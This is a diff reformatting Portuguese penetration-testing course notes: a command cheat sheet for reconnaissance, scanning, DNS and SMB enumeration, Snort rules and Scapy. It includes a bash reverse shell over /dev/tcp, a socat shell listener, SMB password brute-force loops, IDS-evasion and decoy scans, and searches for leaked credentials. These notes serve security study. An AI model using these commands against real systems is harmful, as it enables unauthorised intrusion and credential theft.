@@ -325,8 +325,8 @@ Decifrar código em hexadecimal
 
 
 
-## Análise de código de um pacote
-
+- Análise de código de um pacote
+.
 Os 6 primeiros é o MAC de destino os 6 próximos é o MAC de origem os próximos 2 é o Protocolo o restante é o Payload:
 
     d4 ab 82 45 c4 0c 00 0c 29 76 43 e1 08 00 45 00
@@ -477,7 +477,7 @@ Comandos Windows equivalentes no LINUX
 	}} catch {}
 	}
 
-## Comandos POWERSHELL WEB
+- Comandos POWERSHELL WEB
 
 	Invoke-WebRequest www.businesscorp.com.br -OutFile index.txt
             -Method options/header
@@ -530,19 +530,19 @@ Verifica o tamanho do arquivo enviado e compara para certificar a integridade.
 
     nc -vnz 192.168.0.10 80 
 
-        Escaneia a porta 80 do IP
+Escaneia a porta 80 do IP
 
     nc -vz www.businesscorp.com.br 80  
 
-        Escaneia a porta 80 do site
+Escaneia a porta 80 do site
 
     nc -vnz 192.168.0.10 20-1024 
 
-        Escaneia da porta 20 à 1024
+Escaneia da porta 20 à 1024
 
     for ip in $(cat portlist);do nc -vnz 172.16.1.5 $ip;done 
 
-        PortScan usando um arquivo
+PortScan usando um arquivo
 
 
 - HoneyPot
@@ -583,37 +583,37 @@ Ncat
 
     openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10
 
-        Criando certificado ssl para a comunicação no NCat.
+Criando certificado ssl para a comunicação no NCat.
 
     ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem
 
-        Abre a porta de forma criptografada --allow 192.168.0.5 (permite conexões apenas do host informado).
+Abre a porta de forma criptografada --allow 192.168.0.5 (permite conexões apenas do host informado).
 
     ncat -vn 192.168.2.200 8443 --ssl 
 
-        Conectando de forma encriptada.
+Conectando de forma encriptada.
 
 
 Socat
 
     socat tcp4-listen:2222 
 
-        Alternativa para netcat o - serve para não precisar passar os dois endereços
+Alternativa para netcat o - serve para não precisar passar os dois endereços
 
     socat tcp4:192.168.2.106:555
 
-        Conectando na porta do alvo
+Conectando na porta do alvo
 
     socat tcp-listen:4444 EXEC:/bin/bash
 
-        Ganhando acesso ao shell
+Ganhando acesso ao shell
 
 
 Telnet
 
     telnet www.businesscorp.com.br 80 21
 
-        Opção alternativa ao NC, ftp...
+Opção alternativa ao NC, ftp...
 
 
 Alternativa para conexão reversa usando telnet:
@@ -624,98 +624,98 @@ DEV/TCP
 
     echo "Mensagem" > /dev/tcp/192.168.2.106/4444 
 
-        Conecta com o host com a porta aberta
+Conecta com o host com a porta aberta
 
 
      >/dev/tcp/192.168.2.106/4444 && echo "Porta aberta" 
 
-        PortScan
+PortScan
 
     bash -i > /dev/tcp/192.168.2.106/4444 0>&1 2>&1 
 
-        Envia o bash para o destino e os erros e saídas aparecendo para o destino
+Envia o bash para o destino e os erros e saídas aparecendo para o destino
 
 
 
-    INFORMATION GATHERING - BUSINESS
+## INFORMATION GATHERING - BUSINESS
 
 
     hunter.io 
 
-        Procura por emails apenas informando o domínio do site.
+Procura por emails apenas informando o domínio do site.
 
     http://pwndb2am4tzkvold.onion
 
-        procura por dados em LEAKS
+procura por dados em LEAKS
 
 
     Usando TOR no firefox
 
-        Instala o tor e proxychains, no arquivo de configurações do proxychains adiciona a linha do socks5 e no firefox add o ip e porta do proxy.
+Instala o tor e proxychains, no arquivo de configurações do proxychains adiciona a linha do socks5 e no firefox add o ip e porta do proxy.
 
     https://github.com/jdiazmx/karma 
 
-        Consulta local de LEAKS com TOR instala o KARMA inicia o TOR e usa para consultar LEAKS
+Consulta local de LEAKS com TOR instala o KARMA inicia o TOR e usa para consultar LEAKS
 
     site:pastebin.com "senhas" 
 
-        Procura por palavras "senhas" no site pastebin
+Procura por palavras "senhas" no site pastebin
 
     site:trello.com "senhas" 
 
-        Procura por palavras "senhas" no site pastebin
+Procura por palavras "senhas" no site pastebin
 
     urlcrazy domainname.com 
 
-        Procura domínios similares ao da entrada
+Procura domínios similares ao da entrada
 
 
 Google Hacking:
 
     filetype: intext: inurl: :.com.br 
 
-        Google hacking para pesquisas avançadas
+Google hacking para pesquisas avançadas
 
     cache: url.com.br/do/site/indisponível
 
-        Pesquisa o cache do site que não está mais disponível 
+Pesquisa o cache do site que não está mais disponível 
 
     exploit-db.com/google-hacking-database 
 
-        Base de pesquisas no google Dorks
+Base de pesquisas no google Dorks
 
     firefox 'https://google.com/search?q=site:site.com.br+inurl:exemplo' 
 
-        URL comando para google hacking
+URL comando para google hacking
 
     lynx site.com 
 
-        Navegador por linha de comando
+Navegador por linha de comando
 
     iana.org/whois 
 
-        Procura por endereços direto da fonte na IANA
+Procura por endereços direto da fonte na IANA
 
     lynx --dump 'https://google.com/search?q=site:site.com.br+ext:pdf'  
 
-        Faz um dump com o navegador com linha de comando por PDF
+Faz um dump com o navegador com linha de comando por PDF
 
     wget -q 
 
-        Não apresenta a saída
+Não apresenta a saída
 
     whois -h iana.org/whois site.com.br 
 
-        Força usa a iana na pesquisa
+Força usa a iana na pesquisa
 
     Client.rdap.org
 
-        Alternativa para o whois 
+Alternativa para o whois 
 
 
 Nota: ASN e NETBLOCK Asn é um provedor que precisa de vários netblocks (Blocos de IP)
 
-    INFORMATION GATHERING INFRA
+## INFORMATION GATHERING INFRA
 
 
 Mapear bloco de IP do alvo: search.arin.net/rdap/ OU WHOIS com IP
@@ -730,36 +730,26 @@ Border Gateway Protocol (bgp.he.net e bgpview.io, praticamente tudo está aqui)
 
 Shodan
 
-	Pesquisa avançada por domínios, portas, IPs, câmeras, espalhadas pelo mundo
+Pesquisa avançada por domínios, portas, IPs, câmeras, espalhadas pelo mundo
 
     hostname: Nome do site
-
     os: Sistema operacional
-
     port: Porta
-
     IP: IP
-
     net Busca por rede
-
     country: País
-
     city:  cidade
-
     geo Geolocalização
-
     org Por uma organização
-
     "": Procura por termo
-
 
     shodan init chaveapi 
 
-        Inicia uma sessão via terminal do Shodan 12
+Inicia uma sessão via terminal do Shodan 12
 
     shodan count country:br port:445 contabilidade 
 
-        Procura e mostra a quantidade de host disponíveis
+Procura e mostra a quantidade de host disponíveis
 
     shodan search --fields ip_str,org,port,hostnames country:br port:445
 
@@ -772,352 +762,344 @@ Basicamente a mesma função do SHODAN
 
     location.country_code: BR AND metadata.os: windows 80.http.get.title: TI 
 
-        Busca no Censys parecida com as buscas feitas no shodan
+Busca no Censys parecida com as buscas feitas no shodan
 
 
 Domain Name System
 
-    #host -t A site.com 
+    host -t A site.com 
 
-        Busca IPv4
+Busca IPv4
 
-    #host -t mx site.com 
+    host -t mx site.com 
 
-        Busca informações do servidor de EMAIL
+Busca informações do servidor de EMAIL
 
-    #host -t ns site.com 
+    host -t ns site.com 
 
-        Servidores primarios e secundarios ou mais
+Servidores primarios e secundarios ou mais
 
-    #host -t hinfo site.com
+    host -t hinfo site.com
 
-        Informações do site
+Informações do site
 
-    #host -t aaaa site.com 
+    host -t aaaa site.com 
 
-        Retorna infor do IPv6
+Retorna infor do IPv6
 
     host -t txt site.com 
 
-        Retorna strings em texto info do TXT com configurações do SPF (email) 
+Retorna strings em texto info do TXT com configurações do SPF (email) 
 
     Host for server in $(host -t ns businesscorp.com.br | cut -d " " -f7);do host -l -a businesscorp.com.br $server;done 
 
-        Verificando vulnerabilidade de transferência de zona no DNS com o comando 
+Verificando vulnerabilidade de transferência de zona no DNS com o comando 
 
     for domain in $(cat wordlist.txt);do host -t a $domain.site.com.br | grep -v "NXDOMAIN";done
 
-        Descoberta de HOST por Brute Force
+Descoberta de HOST por Brute Force
 
     for ip in $(seq 220 239);do host 37.59.174.$ip;done
 
-        Descoberta de Domínios por IP
+Descoberta de Domínios por IP
 
     host -t txt desec.com.br 
 
-        Irá retornar os códigos do SPF sabendo se é vulnerável ou não então, realizar teste de envio spoofing: Email Sender: https://emkei.cz/
+Irá retornar os códigos do SPF sabendo se é vulnerável ou não então, realizar teste de envio spoofing: Email Sender: https://emkei.cz/
 
 
 SPF = Verifica quais servidores estão autorizado enviar emails em seu domínio
 
-?all Libera tudo
-
-~all Libera mas com alerta de perigo
-
--all recomendado
+	?all Libera tudo
+	~all Libera mas com alerta de perigo
+	-all recomendado
 
 Subdomain Takeover
 
     host -t cname businesscorp.com.br
 
-        Verifica para onde aponta o Alias possibilitando testar se o Alias existe ou não, podendo assim registrar se possível e ter domínio sobre o registro apontado.
+Verifica para onde aponta o Alias possibilitando testar se o Alias existe ou não, podendo assim registrar se possível e ter domínio sobre o registro apontado.
 
     host -t hinfo businesscorp.com.br
 
-        Verifica mais informações do domínio apresentado.
+Verifica mais informações do domínio apresentado.
 
     for domain in $(cat wordlist.txt);do host -t cname $domain.$1 | grep "alias for";done
 
-        Apresenta os CNAMEs (ALIAS) do SubDomínio encontrado, podendo ou não ser vulnerável.
+Apresenta os CNAMEs (ALIAS) do SubDomínio encontrado, podendo ou não ser vulnerável.
 
     dig -t ns site.com.br 
 
-        Alternativa do comando host
+Alternativa do comando host
 
     dig -t  axfr site.com $ns2.site.com 
 
-        Semelhante ao host, faz a tentativa de transferência nos srv de name servers
+Semelhante ao host, faz a tentativa de transferência nos srv de name servers
 
 
 Ferramentas de Enumeração já pronta
 
     dnsenum site.com 
 
-        Enumeração de DNS, brute force etc.
+Enumeração de DNS, brute force etc.
 
     dnsrecon site.com 
 
-        Apresenta as possíveis vulnerabilidades do domínio
+Apresenta as possíveis vulnerabilidades do domínio
 
     fierce -dns site.com  
 
-        Apresenta as possíveis vulnerabilidades do domínio com bruteforce
+Apresenta as possíveis vulnerabilidades do domínio com bruteforce
+
+Pesquisa passiva sobre domínio
+
+[Virus Total:](https://www.virustotal.com/gui/home/upload)
+
+[DNS Dumpster:](https://dnsdumpster.com/)
+
+[Security Trails:](https://securitytrails.com/)
 
 
-    Pesquisa passiva sobre domínio
+Sites de análises de certificado pesquisas por possíveis subdomínios vulneráveis
 
-        Virus Total: https://www.virustotal.com/gui/home/upload
-
-        DNS Dumpster: https://dnsdumpster.com/
-
-        Security Trails: https://securitytrails.com/
+[CRT SH:](https://crt.sh/)
+	
+[Transparency Report:](https://transparencyreport.google.com/)
 
 
-    Sites de análises de certificado pesquisas por possíveis subdomínios vulneráveis
-
-        CRT SH: https://crt.sh/
-
-        Transparency Report: https://transparencyreport.google.com/
-
-
-
-    INFORMATION GATHERING WEB
+## INFORMATION GATHERING WEB
 
 
     robots.txt e sitemap.xml
 
-        Contém informações de links das páginas do site, em Robots contém as páginas que não são indexadas pelo google.
+Contém informações de links das páginas do site, em Robots contém as páginas que não são indexadas pelo google.
 
     wget -m site.com 
 
-        Mirror website, copia todos os arquivos e páginas para a máquina (clona website).
+Mirror website, copia todos os arquivos e páginas para a máquina (clona website).
 
     wget -m -e robots=off  site.com 
 
-        Mirror website, copia todos os arquivos e páginas para a máquina (clona website) sem se importar com o arquivo robots.
+Mirror website, copia todos os arquivos e páginas para a máquina (clona website) sem se importar com o arquivo robots.
 
     nc -v site.com 80 HEAD / HTTP/1.0 host:site.com 
 
-        Comando serve para testar um domínio específico quando há vários no alvo.
+Comando serve para testar um domínio específico quando há vários no alvo.
 
     dirb website.com
 
-        Faz bruteforce de diretórios  /caminho/da/wordlist/
+Faz bruteforce de diretórios  /caminho/da/wordlist/
 
     dirb website.com -a agenteoculto -X .php 
 
-        Faz bruteforce de diretórios sem ser percebido
+Faz bruteforce de diretórios sem ser percebido
 
     curl -v site.com.br 
 
-        Faz um CURL do site com verbose
+Faz um CURL do site com verbose
 
     curl -I site.com.br/asdaf.aspx 
 
-        Força mostrar o banner com a versão do ASP.NET PHP JS...
+Força mostrar o banner com a versão do ASP.NET PHP JS...
 
     curl -v -H "User-Agent: Desec Tool" site.com.br 
 
-        Burlando o user agent
+Burlando o user agent
 
     curl -s -o /dev/null -w "%{http_code}" businesscorp.com.br 
 
-        Pegando o código da requisição
+Pegando o código da requisição
 
     curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 
 
-        Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa
+Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa
 
     whatweb site.com.br 
 
-        Faz uma busca geral no site e traz informações importantes -v verbose
+Faz uma busca geral no site e traz informações importantes -v verbose
 
     whatweb -v --user-agent 'nome aleatorio' site.com 
 
-        Wappalyzer Plugin para pegar informações do site como banco, linguagem, tecnologias em geral
+Wappalyzer Plugin para pegar informações do site como banco, linguagem, tecnologias em geral
 
 
-
-
-    SCANNING
+## SCANNING
 
 
     traceroute site.com 
 
-        Faz uma análise de saltos do host. -w tempo de espera, -m Máximo de saltos, -f início da contagem dos saltos, -A indica os ASs dos hosts -n não Nomeia os hosts, -I usar o ICMP, -T TCP, -p porta do alvo, -U UDP na porta 53
+Faz uma análise de saltos do host. -w tempo de espera, -m Máximo de saltos, -f início da contagem dos saltos, -A indica os ASs dos hosts -n não Nomeia os hosts, -I usar o ICMP, -T TCP, -p porta do alvo, -U UDP na porta 53
 
     iptables -nL 
 
-        Lista as regras do iptables
+Lista as regras do iptables
 
     iptables -F 
 
-        Limpa as regras do iptables
+Limpa as regras do iptables
 
     iptables -P INPUT DROP 
 
-        Dropa todos os pacotes na corrente de entrada  
+Dropa todos os pacotes na corrente de entrada  
 
     iptables -A INPUT -p tcp --dport 80 -s 192.168.2.20 -j ACCEPT 
 
-        Libera o acesso apenas do host informado na flag -s na porta 80, regra de entrada. --reject-with tcp-reset Dribla o nmap com a reason reset
+Libera o acesso apenas do host informado na flag -s na porta 80, regra de entrada. --reject-with tcp-reset Dribla o nmap com a reason reset
 
     fping -a -g 192.168.2.0/24 
 
-        Varre toda a rede com o ICMP a fim de mostrar os hosts ativos.
+Varre toda a rede com o ICMP a fim de mostrar os hosts ativos.
 
     arping -c 1 192.168.2.10 
 
-        Semelhante ao ping para descobrir hosts com block ping na rede 
+Semelhante ao ping para descobrir hosts com block ping na rede 
 
     arp-scan -l  
 
-        Varre os hosts já identificados
+Varre os hosts já identificados
 
     tcpdump -vn -i wlan0 host 192.168.2.10 and 192.168.2.10  
 
-        Escuta a comunicação de dois hosts
+Escuta a comunicação de dois hosts
 
     nmap -sn 192.168.2.10 
 
-        Varrer o hosts e saber se está ativo ou não
+Varrer o hosts e saber se está ativo ou não
 
     nmap -sn 192.168.2.10 -oN normal.txt 
 
-        Varrer o hosts e saber se está ativo ou não e salvar em um arquivo, N normal, X xml e G grapable possibilitando usar filtros.
+Varrer o hosts e saber se está ativo ou não e salvar em um arquivo, N normal, X xml e G grapable possibilitando usar filtros.
 
     nmap -sS -p 80 -Pn 192.168.2.10 --reason 
 
-        Retorna se a porta 80 está aberta ou não mostrando a razão
+Retorna se a porta 80 está aberta ou não mostrando a razão
 
 
-Nota: 	TCP connect envia RESET depois do 3WHS
-
+Nota:TCP connect envia RESET depois do 3WHS
 No firewall, o certo é bloquear tudo e liberar apenas o que é necessário
-
-Nmap em /usr/share/nmap/scripts É encontrado vários scripts para uso em diversos serviços.
-
-No ping pode-se usar o -w 1 para ser feito o ping mais rápido
+Nmap em ´/usr/share/nmap/scripts´ É encontrado vários scripts para uso em diversos serviços.
+No ping pode-se usar o ´-w 1´ para ser feito o ping mais rápido
 
     nmap -sT -p 80 site.com 
 
-        Exemplo de TCP Connect (PortScan)
+Exemplo de TCP Connect (PortScan)
 
     nmap -v -sTV -p 69 site.com 
 
-        Exemplo de TCP Connect Scan Port ENUMERATION - Banner Grab
+Exemplo de TCP Connect Scan Port ENUMERATION - Banner Grab
 
     HalfOpen/Syn Scan 
 
-        Envia um RESET depois de SYN/ACK do host
+Envia um RESET depois de SYN/ACK do host
 
     nmap -sS --top-ports=5 site.com 
 
-        Exemplo de HalpOpen
+Exemplo de HalpOpen
 
     Flags NMAP: -sF  
 
-        Envia flag FIN para o host e retorna open|filtered, Semelhante ao -sN 
+Envia flag FIN para o host e retorna open|filtered, Semelhante ao -sN 
 
     iptables -nvL 
 
-        Saída mais detalhada com o consumo de Bytes
+Saída mais detalhada com o consumo de Bytes
 
     iptables -A INPUT -s 192.168.2.102 -j ACCEPT
 
-        Grava os pacotes de entrada do host em -s
+Grava os pacotes de entrada do host em -s
 
     iptables -A OUTPUT -d 192.168.2.102 -j ACCEPT
 
-        Grava os pacotes de saída do host em -d
+Grava os pacotes de saída do host em -d
 
     iptables -Z
 
-        Zera todas os registros de Bytes gravados
+Zera todas os registros de Bytes gravados
 
     nmap -v -sU -p 69 site.com
 
-        Exemplo de UDP Connect Scan Port
+Exemplo de UDP Connect Scan Port
 
     nmap -v -sUV -p 69 site.com
 
-        Exemplo de UDP Connect Scan Port ENUMERATION
+Exemplo de UDP Connect Scan Port ENUMERATION
 
     hping3 --udp -p69 192.168.2.102
 
-        Exemplo de UDP Connect Scan Port
+Exemplo de UDP Connect Scan Port
 
 
-Network Sweeping
+- Network Sweeping
+.
 
     nmap -v -sn 192.168.2.0/24 -oG ativos.txt 
 
-        Coloca os hosts UP e Down no arquivo ativos.txt
+Coloca os hosts UP e Down no arquivo ativos.txt
 
     grep "up"cut -d " " ativos.txt  | cut -d " " -f 2 > hosts 
 
-        Filtra pelos hosts UP e coloca em hosts 
+Filtra pelos hosts UP e coloca em hosts 
 
     nmap -sS -p 80 --open -Pn -iL hosts -oG web.txt 
 
-        Ler hosts da lista e apresenta os com port 80 open
+Ler hosts da lista e apresenta os com port 80 open
 
     nmap -sSV -p 80 --open -Pn -iL hosts -oG web.txt 
 
-        Banner grabbing das portas abertas
+Banner grabbing das portas abertas
 
     grep "Apache" web.txt 
 
-        Filtro pelo serviço da porta
+Filtro pelo serviço da porta
 
     nmap -sS -p 139,445 --open -Pn -iL hosts -oG share.txt 
 
-        Varre os hosts com as portas e salva em share
+Varre os hosts com as portas e salva em share
 
     nmap -sS -p 21,22,23,3389 --open -Pn -iL hosts -oG remote.txt 
 
-        Varre portas e salva em remote
+Varre portas e salva em remote
 
     nmap -sS -p 3306,1433 --open -Pn -iL hosts -oG db.txt   
 
-        Varre portas e salva em db
+Varre portas e salva em db
 
     nmap -sS -p http* --open -Pn iL hosts -oG coringa.txt  
 
-        Varre portas com coringa e salva em coringa
+Varre portas com coringa e salva em coringa
 
 
 Identificando serviços
 
     nmap -v -sV -Pn 172.16.1.2 
 
-        Pegando o Banner de todas as portas abertas
+Pegando o Banner de todas as portas abertas
 
 
-Enganando o atacante
+- Enganando o atacante
 
 Nota: /etc/services -> mostra os serviços e as suas respectivas portas padrões
 
     nano etc/ssh/sshd_config 
 
-        Acessa e modifica a porta para enganar o atacante.
+Acessa e modifica a porta para enganar o atacante.
 
     sudo apt install bless 
 
-        Programa para alterar códigos em hexadecimal.
+Programa para alterar códigos em hexadecimal.
 
     cp usr/sbin/sshd /home/user/desktop 
 
-        Cópia de segurança do arquivo. Procura pelo banner e altera para enganar o atacante.
+Cópia de segurança do arquivo. Procura pelo banner e altera para enganar o atacante.
 
 
-OS Fingerprinting
+- OS Fingerprinting
 
-    Parâmetros que podem identificar um Windows: 
+Parâmetros que podem identificar um Windows: 
 
         RDP.3389-Implementação da pilha TCP/IP-NMAP -O / -A
 
-    Identificar o SO pelo TTL (caso esteja padrão)
+Identificar o SO pelo TTL (caso esteja padrão)
 
         Win ttl 128 
 
@@ -1130,54 +1112,54 @@ OS Fingerprinting
         CISCO ttl 254
 
 
-Conectando e lendo mensagens de email via comando
+- Conectando e lendo mensagens de email via comando
 
 IMAP
 
-    nc - v mail.servidor.com 143 
+	nc - v mail.servidor.com 143 
 
-        Conecta-se ao servidor de email
+Conecta-se ao servidor de email
 
         A1 login usuário s3Nh4  autentica no servidor após conectado
 
         g21 SELECT "INBOX" 
 
-        Printa as respostas sobre a caixa de entrada
+Printa as respostas sobre a caixa de entrada
 
         F1 fetch 1 RFC822 
 
-        Lista a mensagem 1
+Lista a mensagem 1
 
         s search draft 
 
-        Procura pelos rascunhos
+Procura pelos rascunhos
 
 
     curl -v imap://camila:ca123456@email.site.com.br/INBOX?NEW 
 
-        Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa
+Conecta com IMAP e retorna OK da conexão com a quantidade de emails na caixa
 
 
 POP 
 
     nc -v mail.servidor.com 110 Conecta com o servidor de email POP
 
-        USER username Usuário da conta
+        USER username - Usuário da conta
 
-        PASS password Senha da conta
+        PASS password - Senha da conta
 
-        LIST Lista a quantidade mensagens e o tamanho
+        LIST - Lista a quantidade mensagens e o tamanho
 
-        STAT Apresenta as quantidade de mensagem
+        STAT - Apresenta as quantidade de mensagem
 
-        RETR 1 Ler a mensagem 1
+        RETR 1 - Ler a mensagem 1
 
 
 SMTP
 
     nv -v 192.168.2.101 25 Conecta na porta SMTP
 
-        HELO Lista info do servidor
+	HELO Lista info do servidor
 
         EHLO Lista comandos aceitos e mais infos do server
 
@@ -1192,59 +1174,58 @@ SMTP
         DATA ... Digita a mensagem e finaliza com um ponto e enter
 
 
-    BURLANDO MECANISMOS DE DEFESA
+## BURLANDO MECANISMOS DE DEFESA
 
 
     NMAP -v -sS -g 53 192.168.2.10 
 
-        Encontrar Portas filtradas pelo firewall. O -g podendo ser trocado por --source-port, é a mesma coisa. Para interagir com a porta descoberta rode nc -vn -p 53 192.168.2.10 8081  e capture o banner! Ou podendo enviar a saída para um arquivo > /var/www/html/recon.html  
+Encontrar Portas filtradas pelo firewall. O ´-g´ podendo ser trocado por ´--source-port´, é a mesma coisa. Para interagir com a porta descoberta rode ´nc -vn -p 53 192.168.2.10 8081´  e capture o banner! Ou podendo enviar a saída para um arquivo ´> /var/www/html/recon.html´
 
 
     snort -A fast -q -h 192.168.2.0/24 -c snort.conf 
 
-        Monitorar em tail -f alert /var/log/snort/ 
+Monitorar em ´tail -f alert /var/log/snort/´
 
     snort -A console -q -h 192.168.2.0/24 -c snort.conf 
 
-        Habilita o IDS e já monitora 
+Habilita o IDS e já monitora 
 
 
 Arquivos de regras do snort
 
     alert tcp any any -> 192.168.2.105 any (msg: "Tão te atacando";sid:1000001; rev:1;) 
 
-        Cria arquivo com .rules onde o primeiro any é a origem e o segundo a porta de origem o terceiro a porta de destino o IP é da sua máquina. O path do arquivo deve ser adicionado em snort.conf no final.
+Cria arquivo com .rules onde o primeiro any é a origem e o segundo a porta de origem o terceiro a porta de destino o IP é da sua máquina. O path do arquivo deve ser adicionado em snort.conf no final.
 
     alert tcp any any -> 192.168.2.105 22 (msg: "Pacote SYN enviado ao SSH";flags:S;sid:1000001; rev:1;) 
 
-        Exemplo de portas específicas e filtros de flags. SYN como no setado acima.
+Exemplo de portas específicas e filtros de flags. SYN como no setado acima.
 
     alert tcp any any -> 192.168.2.105 80 (msg: "Acesso ao arquivo robots.txt";content:"robots.txt";sid:1000001; rev:1;) 
 
-        Exemplo de portas específicas e filtros de conteúdos. robots.txt como no setado acima.
+Exemplo de portas específicas e filtros de conteúdos. robots.txt como no setado acima.
 
     alert tcp any any -> 192.168.2.105 80 (msg: "Possivel SQL Injection";content:"%27";sid:1000001; rev:1;) 
 
-        Exemplo de portas específicas e filtros de conteúdos. %27 como no setado acima.
+Exemplo de portas específicas e filtros de conteúdos. %27 como no setado acima.
 
 
-Bypass SNORT
+- Bypass SNORT
 
-Nota: 	Pegando o exemplo do ICMP, o SNORT captura os pacotes e alerta, o ideal é pegar o arquivo de regras no SNORT e analisar cada alerta emitida no ping.
-
-	Analisar as regras para saber como burlar as mesmas com outros mecanismos.
+Nota:Pegando o exemplo do ICMP, o SNORT captura os pacotes e alerta, o ideal é pegar o arquivo de regras no SNORT e analisar cada alerta emitida no ping.
+Analisar as regras para saber como burlar as mesmas com outros mecanismos.
 
     ping -c1 -p "6568674124" 192.168.2.105 
 
-        Burlando os dados do pacote enviado passando hex diferente
+Burlando os dados do pacote enviado passando hex diferente
 
     hping3 -c1 -C 8 -K 1 --icmp 192.168.2.105 
 
-        Burlando o código do pacote burlando a regra icode para 1
+Burlando o código do pacote burlando a regra icode para 1
 
     hping3 -c1 -C 8 -K 1 -d 23 --icmp 192.168.2.105 
 
-        Burlando o tamanho dos dados para não ser detectado
+Burlando o tamanho dos dados para não ser detectado
 
 
 PortSentry simula portas abertas no host. No portsentry.conf tem as portas que deseja abrir, e a ação a ser tomada quando detectado a intrusão. Marca a opção TCP e UDP como 1 para fazer valer as regras de bloqueio. Habilita ou desabilita a ação padrão ou usa a do IPTABLES
@@ -1261,197 +1242,198 @@ Analisar os arquivos hosts.deny em ETC para ver se tem algum bloqueio de IP.
 
     nmap -sS --open --top-ports=10 -Pn 192.168.2.105
 
-        Analisa as 10 top ports, caso uma dessas portas não esteja configurado no IPS para detectar, caso contrário irá detectar. Podendo aumentar ou diminuir o tempo de processamento do scanner com a flag -T. Flag -D (decoy), Exemplo: nmap -sS --open --top-ports=25 -Pn -D 10.10.2.4,192.168.25.25,10.0.0.14 192.168.2.105 Ou -D RND:50 Pegando 50 endereços aleatórios para misturar
+Analisa as 10 top ports, caso uma dessas portas não esteja configurado no IPS para detectar, caso contrário irá detectar. Podendo aumentar ou diminuir o tempo de processamento do scanner com a flag -T. Flag -D (decoy), Exemplo: nmap -sS --open --top-ports=25 -Pn -D 10.10.2.4,192.168.25.25,10.0.0.14 192.168.2.105 Ou -D RND:50 Pegando 50 endereços aleatórios para misturar
 
 
 
-    TRABALHANDO COM SCAPY
+## TRABALHANDO COM SCAPY
 
 
     ls(IP)
 
-        Lista as opções customizáveis do pacote IP (TCP)
+Lista as opções customizáveis do pacote IP (TCP)
 
     pIP = IP(dst="192.168.2.1")
 
-        Cria variável com o ip de destino.
+Cria variável com o ip de destino.
 
     pIP / pIP.show() / pIP.summary 
 
-        Lista o pacote/variável criado(a)
+Lista o pacote/variável criado(a)
 
     pTCP = TCP(dport=80, flags="S") 
 
-        Cria o pacote TCP
+Cria o pacote TCP
 
     pTCP.dport=80, 443, 9090 
 
-        Adiciona mais portas ao pacote TCP
+Adiciona mais portas ao pacote TCP
 
     pTCP.sport=457889 
 
-        Porta de origem no pacote TCP
+Porta de origem no pacote TCP
 
     pacote = pIP/pTCP
 
-        Formando o pacote TCP/IP
+Formando o pacote TCP/IP
 
     sr1(pacote)
 
-        Enviando Um pacote TCP/IP
+Enviando Um pacote TCP/IP
 
     sr(pacote)
 
-        Enviando vários pacotes TCP/IP é o exemplo de várias portas
+Enviando vários pacotes TCP/IP é o exemplo de várias portas
 
     resposta = sr1(pacote)
 
-        Grava em resposta a saída do envio do pacote
+Grava em resposta a saída do envio do pacote
 
     resposta.show()
 
-        Mostra a variável criada
+Mostra a variável criada
 
     resposta[IP].dst
 
-        Mostra o atributo dst do pacote IP
+Mostra o atributo dst do pacote IP
 
     resposta[TCP].flags
 
-        Mostra o atributo flags do pacote TCP
+Mostra o atributo flags do pacote TCP
 
     resp, noresp = sr(pacote)
 
-        Grava em resp e no respe as respostas e não respostas respectiv
+Grava em resp e no respe as respostas e não respostas respectiv
 
     pacote = pIP/ICMP()/"DESEC"
 
-        Pacote ICMP com payload "DESEC"
+Pacote ICMP com payload "DESEC"
 
     pacote = pIP/pTCP/"Desec"
 
-        Pacote TCP com payload "Desec"
+Pacote TCP com payload "Desec"
 
 
 Nota: Requisição de conexão HTTP OPTIONS retorna os métodos de requisições aceitos pela aplicação. Na requisição colocando 1.1 no HTTP é possível especificar o HOST para ir direto ao domínio
 
-    ENUMERATION
-
+## ENUMERATION 
+Tags: Enumeração
 
     openssl s_client -quiet -connect www.tesla.com:443 
 
-        Faz uma conexão de forma segura com criptografia seguido do HEAD / HTTP/1.1 HOST www.tesla.com recomenda-se usar o HTTP 1.1
+Faz uma conexão de forma segura com criptografia seguido do HEAD / HTTP/1.1 HOST www.tesla.com recomenda-se usar o HTTP 1.1
 
     wafw00f tesla.com 
 
-        Identificando o firewall que a aplicação está utilizando
+Identificando o firewall que a aplicação está utilizando
 
     ftp host.com 
 
-        Conexão FTP com o servidor passando login e senha | anonymous anonymous, ftp ftp comando passivo habilita o modo passivo podendo listar os arquivos
+Conexão FTP com o servidor passando login e senha | anonymous anonymous, ftp ftp comando passivo habilita o modo passivo podendo listar os arquivos
 
 
 Nota:	Porta 139 NetBios porta mais antiga
 
 Porta 445 SMB serviço mais atual
 
-ENUMERANDO SMB NO CMD	
+- Enumerando SMB no CMD	
+.
 
     nbtstat -A 192.168.2.101 
 
-        Retorna informações da máquina como nome, grupo etc...
+Retorna informações da máquina como nome, grupo etc...
 
     net view \\192.168.2.101 
 
-        Lista os arquivos compartilhados do host
+Lista os arquivos compartilhados do host
 
     net use \\ 192.168.2.101 "" /u:"" 
 
-        Tenta estabelecer um NULL Session (sem user e pass) no netbios
+Tenta estabelecer um NULL Session (sem user e pass) no netbios
 
     nbtstat -c 
 
-        Mostra o cache das buscas realizadas
+Mostra o cache das buscas realizadas
 
     net use h: \\192.168.2.101\filename 
 
-        Monta o compartilhamento no H
+Monta o compartilhamento no H
 
     net use h: /delete 
 
-        Deleta o compartilhamento montado
+Deleta o compartilhamento montado
 
     for /f %i in (wordlist.txt) do net use \\192.168.2.101 %i /u:usr 
 
-        Brute force smb no CMD
+Brute force smb no CMD
 
     for /f "tokens=1,2" %i in (wordlist.txt) do net use \\192.168.2.101 %j /u:%i 
 
-        Brute force smb no CMD com login e senha
+Brute force smb no CMD com login e senha
 
 
-Enumerando SMB no terminal
+- Enumerando SMB no terminal
 
-Alternativa nmblookup
+Alternativa: nmblookup
 
     nbtstat -r 192.168.2.0/24
 
-        Procura por hosts com compartilhamento de arquivos ativos
+Procura por hosts com compartilhamento de arquivos ativos
 
     smbclient -L \\192.168.2.101
 
-        Lista os arquivos do host com smb ativo -N Loga como usuário anônimo -U para passar um usuário sem senha. Se usando uma ferramenta mais recente em hosts antigos use o parâmetro --option='client min protocol=NT1'
